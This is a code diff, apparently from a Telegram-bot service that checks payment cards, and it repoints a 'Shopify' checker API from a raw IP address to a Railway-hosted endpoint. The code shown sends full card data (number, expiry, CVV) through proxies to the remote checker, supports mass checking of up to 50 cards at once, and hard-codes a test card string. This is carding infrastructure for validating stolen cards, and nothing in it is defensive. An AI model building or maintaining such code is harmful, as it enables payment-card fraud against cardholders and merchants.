@@ -5396,7 +5396,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 `);
 
         const startTime = Date.now();
-        const SHOPIFY_API_URL = "http://108.165.12.183:8081/";
+        const SHOPIFY_API_URL = "https://web-production-9db0.up.railway.app/shopify";
         const SHOPIFY_DEBUG_CHAT = "-1003848532661";
         const SH_UNKNOWN_RETRIES = 4;
 
@@ -5483,7 +5483,7 @@ Go to yunchicheck.com/dashboard → Proxies
 
           // Helper: single API call
           const callShopifyOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
-            const apiUrl = `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
+            const apiUrl = `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), 55000);
             try {
@@ -5831,7 +5831,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
 
-        const SHOPIFY_API_URL_MSH = "http://108.165.12.183:8081/";
+        const SHOPIFY_API_URL_MSH = "https://web-production-9db0.up.railway.app/shopify";
         const MSH_DEBUG_CHAT = "-1003848532661";
         const MSH_UNKNOWN_RETRIES = 3;
         const mshStartTime = Date.now();
@@ -5881,7 +5881,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
         // Single call helper
         const mshCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
-          const apiUrl = `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
+          const apiUrl = `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
           const controller = new AbortController();
           const timeout = setTimeout(() => controller.abort(), 45000);
           try {
@@ -6233,7 +6233,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
 
-         const SHOPIFY_API_URL_MTXT = "http://108.165.12.183:8081/";
+         const SHOPIFY_API_URL_MTXT = "https://web-production-9db0.up.railway.app/shopify";
          const MTXT_MAX_RETRIES = 2; // Reduced for mass checking (50 concurrent cards)
          const mtxtStartTime = Date.now();
 
@@ -6299,7 +6299,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
          // Single API call — exact match of web callApiOnce
          const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
-           const apiUrl = `${SHOPIFY_API_URL_MTXT}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
+           const apiUrl = `${SHOPIFY_API_URL_MTXT}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 55000); // 55s like web
            try {
@@ -9724,7 +9724,7 @@ ${resultsDisplay || "Waiting for results..."}
       // Two API endpoints for checking sites
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) => 
-          `http://108.165.12.183:8081/?cc=${cc}&url=${site}&proxy=${proxy}`,
+          `https://web-production-9db0.up.railway.app/shopify?cc=${cc}&site=${site}&proxy=${proxy}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
